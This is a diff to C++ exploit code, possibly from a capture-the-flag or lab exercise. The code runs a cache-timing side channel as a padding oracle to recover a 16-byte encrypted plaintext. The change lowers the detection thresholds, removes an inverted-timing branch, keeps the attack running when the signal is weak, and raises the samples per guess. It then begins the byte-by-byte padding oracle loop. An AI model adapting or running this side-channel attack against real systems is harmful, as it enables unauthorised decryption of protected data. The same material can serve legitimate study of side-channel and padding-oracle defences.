@@ -249,31 +249,32 @@ void RunStoredCommands([[maybe_unused]] simple_networking::TCPClient* client) {
   std::cout << "    With dynamic threshold (" << dynamic_threshold << "): valid=" << valid_hits_dyn << " invalid=" << invalid_hits_dyn << std::endl;
 
   // Determine which works better
+  // LogError called = cache hit = MORE hits for corrupted/invalid
+  // Valid padding = LogError NOT called = FEWER hits
   bool use_cache_hits = false;
   uint64_t use_threshold = g_threshold;
 
-  if (invalid_hits_dyn > valid_hits_dyn + 5) {
+  if (invalid_hits_dyn > valid_hits_dyn + 2) {
     use_cache_hits = true;
     use_threshold = dynamic_threshold;
-    std::cout << "[+] Side channel WORKING with dynamic threshold" << std::endl;
-  } else if (invalid_hits_cal > valid_hits_cal + 5) {
+    std::cout << "[+] Side channel WORKING with dynamic threshold (invalid="
+              << invalid_hits_dyn << " > valid=" << valid_hits_dyn << ")" << std::endl;
+  } else if (invalid_hits_cal > valid_hits_cal + 2) {
     use_cache_hits = true;
     use_threshold = g_threshold;
     std::cout << "[+] Side channel WORKING with calibrated threshold" << std::endl;
-  } else if (invalid_med < valid_med * 0.95) {
-    // Invalid is faster? Check if LogError causes cache hit that speeds up our probe
-    std::cout << "[+] Trying inverted detection (invalid faster = cache hit)" << std::endl;
-    use_cache_hits = true;
-    use_threshold = dynamic_threshold;
   } else {
-    std::cout << "[+] Side channel NOT WORKING - using minimum probe time" << std::endl;
+    std::cout << "[+] Side channel WEAK - using more samples" << std::endl;
+    use_cache_hits = true;  // Still try cache-based approach
+    use_threshold = dynamic_threshold;
   }
 
   // Plaintext: "nobody-XXXXXXXX" + 0x01 padding = 16 bytes
   std::vector<uint8_t> intermediate(16, 0);
   std::vector<uint8_t> recovered(16, 0);
 
-  const int SAMPLES = use_cache_hits ? 7 : 3;
+  // Use more samples since signal is weak
+  const int SAMPLES = 15;
 
   // Padding oracle attack
   for (int pos = 15; pos >= 0; pos--) {
